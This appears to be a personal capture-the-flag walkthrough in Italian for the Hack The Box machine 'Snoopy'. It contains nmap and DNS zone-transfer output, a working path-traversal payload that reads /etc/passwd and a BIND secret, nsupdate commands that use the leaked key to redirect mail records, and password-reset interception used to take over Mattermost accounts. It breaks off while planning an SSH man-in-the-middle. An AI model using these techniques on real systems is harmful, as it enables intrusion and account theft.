@@ -1,0 +1,600 @@
+10.10.11.212
+
+└─$ nmap -vv -p- -T4 -n -Pn -oA fastscan_external 10.10.11.212   
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-22 18:26 CEST
+Initiating Connect Scan at 18:26
+Scanning 10.10.11.212 [65535 ports]
+Discovered open port 22/tcp on 10.10.11.212
+Discovered open port 80/tcp on 10.10.11.212
+Discovered open port 53/tcp on 10.10.11.212
+Completed Connect Scan at 18:26, 19.19s elapsed (65535 total ports)
+Nmap scan report for 10.10.11.212
+Host is up, received user-set (0.051s latency).
+Scanned at 2023-07-22 18:26:08 CEST for 19s
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+53/tcp open  domain  syn-ack
+80/tcp open  http    syn-ack
+
+
+
+
+
+port 80
+
+
+
+    SnoopySec is a leading provider of DevSecOps tooling for web-based businesses. We offer a comprehensive suite of services designed to help our clients build and maintain secure web applications throughout their entire lifecycle.
+
+    Download our press release package here or download our recent announcement here
+
+
+
+http://snoopy.htb/download
+http://snoopy.htb/download?file=announcement.pdf
+
+aggiungo snoopy.htb a /etc/hosts
+
+nel pdf:
+
+To learn more about SnoopySec's DevSecOps tooling or to schedule a demo, please visit
+our website at www.snoopy.htb.
+Contact:
+Sally Brown
+SnoopySec PR
+pr@snoopy.htb
+1-800-123-4567
+
+
+
+senza mettere il filename mi scarica anche un video .mp4
+
+
+nel video trovo anche 
+
+sbrown@snoopy.htb
+
+
+sul sito:
+
+
+Charles Schultz
+Chief Executive Officer cschultz@snoopy.htb
+
+
+Sally Brown
+Product Manager sbrown@snoopy.htb
+
+
+Harold Angel
+CTO hangel@snoopy.htb
+
+
+Lucy Van Pelt
+Accountant lpelt@snoopy.htb
+
+
+
+
+info@snoopy.htb
+
+
+in http://snoopy.htb/contact.html
+
+c'è un annuncio
+
+in cui dice che mentre fanno una MIGRAZIONE DNS mail.snoopy.htb è offline
+
+1) provo ad interrogare il server dns esposto sulla macchina 
+
+┌──(kali㉿kali)-[~/…/ctfs-writeups/htb/done/snoopy]
+└─$ dig axfr snoopy.htb +all @10.10.11.212
+
+; <<>> DiG 9.18.12-1-Debian <<>> axfr snoopy.htb +all @10.10.11.212
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 43840
+;; flags: qr aa; QUERY: 1, ANSWER: 11, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 1232
+; COOKIE: 443260a5b1488c9e0100000064bc05c28cdf588775c6f5d7 (good)
+;; QUESTION SECTION:
+;snoopy.htb.                    IN      AXFR
+
+;; ANSWER SECTION:
+snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
+snoopy.htb.             86400   IN      NS      ns1.snoopy.htb.
+snoopy.htb.             86400   IN      NS      ns2.snoopy.htb.
+mattermost.snoopy.htb.  86400   IN      A       172.18.0.3
+mm.snoopy.htb.          86400   IN      A       127.0.0.1
+ns1.snoopy.htb.         86400   IN      A       10.0.50.10
+ns2.snoopy.htb.         86400   IN      A       10.0.51.10
+postgres.snoopy.htb.    86400   IN      A       172.18.0.2
+provisions.snoopy.htb.  86400   IN      A       172.18.0.4
+www.snoopy.htb.         86400   IN      A       127.0.0.1
+snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
+
+;; Query time: 55 msec
+;; SERVER: 10.10.11.212#53(10.10.11.212) (TCP)
+;; WHEN: Sat Jul 22 18:37:28 CEST 2023
+;; XFR size: 11 records (messages 1, bytes 325)
+
+
+
+
+ci sono vari subdomains interessanti 
+
+aggiungo tutto a hosts
+
+10.10.11.212    snoopy.htb                  Sito web di prima
+10.10.11.212    www.snoopy.htb              Stesso di snoopy.htb
+10.10.11.212    mattermost.snoopy.htb       Stesso di snoopy.htb
+10.10.11.212    postgres.snoopy.htb         Stesso di snoopy.htb
+10.10.11.212    mm.snoopy.htb               Mattermost
+10.10.11.212    provisions.snoopy.htb       Stesso di snoopy.htb
+10.10.11.212    ns1.snoopy.htb              Stesso di snoopy.htb
+10.10.11.212    ns2.snoopy.htb              Stesso di snoopy.htb
+
+
+mi concentro su 
+mm.snoopy.htb
+
+
+login -> non so ne password ne username (anche se come username potrei usare uno di quelli trovati sul sito, potrebbe funzionare)
+
+probabilmente la funzionalità di download ha una LFI in quanto prende il nome del file come parametro
+
+http://snoopy.htb/download?file=announcement.pdf
+
+dopo alcuni tentativi riesco a sfruttarla:
+
+http://snoopy.htb/download?file=....//....//....//....//....//....//....//....//....//....//....//....//etc//passwd
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
+sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
+clamav:x:1002:1003::/home/clamav:/usr/sbin/nologin
+lpelt:x:1003:1004::/home/lpelt:/bin/bash
+cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
+vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash
+bind:x:108:113::/var/cache/bind:/usr/sbin/nologin
+_laurel:x:999:998::/var/log/laurel:/bin/false
+
+
+
+
+visto che non so cosa cercare dovrei fare uno script che usa una wordlist (lfi_wordlist_1 l'ho gia modificata cosi usa // al posto di /)
+per prima cosa gli faccio solo controllare solo la dimensione del file zip cosi diminuisco la wordlist e tolgo tutto  quello che non trova/non puo leggere
+
+
+
+python3 lfi_scan.py
+//etc//adduser.conf
+//etc//bash.bashrc
+//etc//ca-certificates.conf
+//etc//crontab
+//etc//crypttab
+//etc//debconf.conf
+//etc//debian_version
+//etc//default//grub
+//etc//deluser.conf
+//etc//dhcp//dhclient.conf
+//etc//fstab
+//etc//fuse.conf
+//etc//group
+//etc//group-
+//etc//host.conf
+//etc//hostname
+//etc//hosts
+//etc//hosts.allow
+//etc//hosts.deny
+//etc//issue
+//etc//issue.net
+//etc//ld.so.conf
+//etc//ldap//ldap.conf
+//etc//login.defs
+//etc//modules
+//etc//mtab
+//etc//networks
+//etc//nginx//nginx.conf
+//etc//os-release
+//etc//pam.conf
+//etc//passwd
+//etc//passwd-
+//etc//profile
+//etc//resolv.conf
+//etc//security//access.conf
+//etc//security//group.conf
+//etc//security//limits.conf
+//etc//security//namespace.conf
+//etc//security//pam_env.conf
+//etc//security//sepermit.conf
+//etc//security//time.conf
+//etc//ssh//sshd_config
+//etc//sysctl.conf
+//etc//sysctl.d//10-console-messages.conf
+//etc//sysctl.d//10-network-security.conf
+//etc//timezone
+//etc//updatedb.conf
+//proc//cpuinfo
+//proc//devices
+//proc//meminfo
+//proc//net//tcp
+//proc//net//udp
+//proc//self//cmdline
+//proc//self//fd//0
+//proc//self//fd//1
+//proc//self//fd//2
+//proc//self//fd//5
+//proc//self//mounts
+//proc//self//stat
+//proc//self//status
+//proc//version
+//usr//share//adduser//adduser.conf
+//var//log//nginx//access.log
+//var//log//nginx//error.log
+
+
+
+provo anche altre wordlist
+
+└─$ cp /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt ./lfi_wordlist_2 
+
+
+└─$ cp /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt ./lfi_wordlist_3
+
+└─$ python3 lfi_scan.py > lfi_scan_out_wordlist_3
+
+questa wordlist ha trovato molti risultati, anche i file di configurazione del servizio dns
+
+//etc//bind//named.conf:
+
+
+// This is the primary configuration file for the BIND DNS server named.
+//
+// Please read /usr/share/doc/bind9/README.Debian.gz for information on the 
+// structure of BIND configuration files in Debian, *BEFORE* you customize 
+// this configuration file.
+//
+// If you are just adding zones, please do that in /etc/bind/named.conf.local
+
+include "/etc/bind/named.conf.options";
+include "/etc/bind/named.conf.local";
+include "/etc/bind/named.conf.default-zones";
+
+key "rndc-key" {
+    algorithm hmac-sha256;
+    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
+};
+
+
+//etc//bind//named.conf.local:
+
+//
+// Do any local configuration here
+//
+
+// Consider adding the 1918 zones here, if they are not used in your
+// organization
+//include "/etc/bind/zones.rfc1918";
+
+zone "snoopy.htb" IN {
+    type master;
+    file "/var/lib/bind/db.snoopy.htb";
+    allow-update { key "rndc-key"; };
+    allow-transfer { 10.0.0.0/8; };
+};
+
+
+a quanto pare c'è allow-update quindi è possibile fare l'update dei vhost per snoopy.htb, e specifica che si può usare 
+la rndc-key 
+che ho trovato nell'altro file:
+
+
+key "rndc-key" {
+    algorithm hmac-sha256;
+    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
+};
+
+
+
+quindi con questa key posso aggiungere sottodomini a snoopy.htb 
+
+potrei vedere se riesco ad aggiungere mail.snoopy.htb che dice che è stato dismesso
+
+posso usare nsupdate:
+
+https://kiko.ghost.io/things-i-wish-id-known-about-nsupdate-and-dynamic-dns-updates/
+https://www.tutorialspoint.com/unix_commands/nsupdate.htm
+
+
+┌──(kali㉿kali)-[~/…/ctfs-writeups/htb/done/snoopy]
+└─$ nsupdate -y "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=" 
+key option must specify [hmac:]keyname:secret
+                                                                                          
+┌──(kali㉿kali)-[~/…/ctfs-writeups/htb/done/snoopy]
+└─$ nsupdate -y "hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=" 
+> 
+
+
+
+
+ora posso provare a fare nsupdate
+
+┌──(kali㉿kali)-[~/…/ctfs-writeups/htb/done/snoopy]
+└─$ nsupdate -y "hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=" 
+> server 10.10.11.212 53
+> zone snoopy.htb
+> update add mail.snoopy.htb 3600 A 127.0.0.1
+> send
+> 
+
+
+
+
+me lo fa aggiungere correttamente, posso verificare con dig
+
+
+si me lo ha aggiunto 
+
+mail.snoopy.htb.        3600    IN      A       127.0.0.1
+
+due problemi
+
+1) l'ho messo come A e non come MX
+2) metterlo su 127.0.0.1 non mi serve a nulla perchè comunque non ho porte esposte a cui collegarmi e da web non serve
+
+però andando su mattermost c'è l'opzione per fare il reset password:
+
+http://mm.snoopy.htb/reset_password
+
+e la manda sull'email.
+
+
+se configuro il mail server del dominio snoopy.htb (a cui appartengono le mail che ho trovato) sul mio ip potrei riuscire a ricevere le mail 
+
+
+per prima cosa cambio il record dns
+
+> update add mail.snoopy.htb 3600 A 10.10.14.12 
+> send                                                                                                                                                                                                            
+>      
+
+posso usare postfix
+
+https://www.gmass.co/blog/smtp-server-linux/
+
+
+forse è piu complicato di quello che mi serve 
+
+
+provo con uno script python
+
+python3 smtp_server.py
+non funziona, lo faccio senza script 
+
+
+sudo python -m smtpd -c DebuggingServer -n 10.10.14.12:25
+
+ora provo con tutte le mail trovate 
+
+cschultz@snoopy.htb
+sbrown@snoopy.htb
+hangel@snoopy.htb
+lpelt@snoopy.htb
+
+
+l'unico per cui riesco a resettare la password è sbrown@snoopy.htb
+
+ricevo la mail con il link:
+
+
+b'Reset Your Password'
+b'Click the button below to reset your password. If you didn=E2=80=99t reques='
+b't this, you can safely ignore this email.'
+b''
+b'Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3Dgn7od='
+b'4zz64xo3qyjq78fy4s1up8c1ihigx9hc7d9famxrmomkg3tofqqixhtrin6 )'
+
+http://mm.snoopy.htb/reset_password_complete?token=3Dgn7od=4zz64xo3qyjq78fy4s1up8c1ihigx9hc7d9famxrmomkg3tofqqixhtrin6
+
+il link non corrisponde, mi dice che il token è sbagliato, forse per l'encoding con cui me lo stampa il server smtpd
+
+
+dopo varie prove si deve togliere 3D e il secondo =
+
+http://mm.snoopy.htb/reset_password_complete?token=gn7od4zz64xo3qyjq78fy4s1up8c1ihigx9hc7d9famxrmomkg3tofqqixhtrin6
+
+cosi riesco a resettarla a sbrown@snoopy.htb:password123
+
+
+
+
+
+conversazione in un canale:
+
+
+cbrown
+6:18 PM
+
+Hey everyone, I just created a new channel dedicated to submitting requests for new server provisions as we start to roll out our new DevSecOps tool. 
+sbrown
+6:18 PM
+
+ That's great, Charlie! We really needed a dedicated channel for this.
+lpelt
+6:18 PM
+
+Yeah, now we can keep track of all the server requests and make sure they get processed quickly.
+pjean
+6:19 PM
+
+Speaking of security, have we talked about protecting the new servers with any kind of endpoint protection?  Maybe ClamAV? 
+cbrown
+6:20 PM
+
+That's a great point, Peggy. We should definitely look into that.
+vgray
+6:20 PM
+
+I'm not familiar with ClamAV, what is it?
+cbrown
+6:23 PM
+
+It's an open-source antivirus software that can detect and remove various types of malware.  We're currently using it now for some of our servers.
+vgray
+6:23 PM
+
+I'm glad we're taking security seriously. It's always better to be safe than sorry.
+cschultz
+6:24 PM
+
+That's right, Violet. With the new tools that we have starting to roll out and the use of ClamAV, we're taking a big step towards a more secure and efficient workplace.
+cbrown
+6:27 PM
+
+Okay guys, as we push to get things stood up just make sure the host you're requesting a provision for is already working with our IPA.  Otherwise I won't be able to log in.  Thanks in advance!
+lpelt
+6:30 PM
+
+Thanks, Charlie!
+sbrown
+6:31 PM
+
+Thank you!
+6:33 PM
+
+By the way, Charlie.  I'm trying to work on a new module and having trouble.  I need your help, but I'll speak to you in person so I can get you up to speed.
+cbrown
+6:33 PM
+
+No worries.  Talk soon!
+
+
+
+ClamAV
+
+
+
+
+
+c'è una possibile integrazione con slash commands (integrazione di mattermost che permette di avere comandi a disposizione)
+
+
+
+
+
+un comando è gia salvato
+
+Slash Commands
+Use slash commands to connect external tools to Mattermost. Build Your Own or visit the App Directory to find self-hosted, third-party apps and integrations.
+Server Provision- /server_provision
+- Edit -
+Request an IT staff member to provision a new server
+Token: 9zgabp4w7bfszrww9t67oyrzga
+Created by sbrown on Saturday, March 18, 2023
+
+
+
+posso anche crearlo uno nuovo, potrebbe permettermi di fare richieste a servizi presenti all'interno della macchina
+
+
+intanto provo /server_provision
+
+
+ho provato a compilare la richiesta mettendo un server linux e inserendo l'ip della macchina, ma ho ricevuto solo un messaggio da cbrown:
+
+
+cbrown
+5:44 PM
+
+something wrong with this instance? i cant access it
+
+
+
+
+non riesco a fare richieste che vadano a buon fine quindi a questo punto provo ad accedere come cbrown, che a quanto pare docvrebbe poter accedere ai server ecc
+quindi potrebbe avere conversazioni utili 
+
+e non avevo la sua mail prima 
+
+http://mm.snoopy.htb/reset_password_complete?token=ino5hzs8sjcc6mfx5o7j1qk337mwdp3fzdxbhiao1u1a8dhyht7nfpbiaopwcr5t
+
+cbrown@snoopy.htb:password123
+
+
+niente di utile mi sembra 
+
+
+cschultz@snoopy.htb
+sbrown@snoopy.htb
+hangel@snoopy.htb
+lpelt@snoopy.htb
+
+
+resetto anche per gli altri sperando di trovare qualcosa altrimenti torno su quella strada del server_provisioning 
+
+(prima non funzionava per tutti perche il record mail viene cancellato automaticamente dopo pochissimo quindi devo mandare update e send tramite nsupdate subito prima di far partire la richiesta)
+
+http://mm.snoopy.htb/reset_password_complete?token=87bh7pco4yjha3q3nabfnm5sswyn4gbw75egtf487dozw9fpi6ei8yo8foehhx4z
+
+cschultz@snoopy.htb:password123
+
+
+http://mm.snoopy.htb/reset_password_complete?token=fif8o39184te1x3x7qpkii7jgm4b47wx73ds1pcdxbj47f6bj5kdnt9hyjukfao9
+
+http://mm.snoopy.htb/reset_password_complete?token=8gzhfoix76zmdrzktdjrgzg5a1ucrguaxxp6qo5w9mod6sm8sj84pwgkjhthu1bs
+
+niente anche con gli altri utenti 
+
+
+provo a mettere vari ip nella richiesta visto che è l'unica cosa che posso fare 
+
+
+provo a mettere il mio per vedere se effettivamente succede qualcosa e intercetto con tcpdump
+
+se effettivamente cbrown cerca di loggarsi posso fare una cosa simile a smb con responder per rubare le credenziali che usa 
+e cercare poi di capire se vengono utilizzate per accedere anche a ssh sulla macchina snoopy
+
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh#ssh-mitm
+
+
+https://github.com/jtesta/ssh-mitm
+
+
+forse la cosa piu utile sarebbe questa 
+
+Developer Documentation
+In lol.h are two defines: DEBUG_HOST and DEBUG_PORT. Enable them and set the hostname to a test server. Now you can connect to sshd_mitm directly without using ARP spoofing in order to test your changes, e.g.:
+
+ssh -p 2222 valid_user_on_debug_host@localhost
+
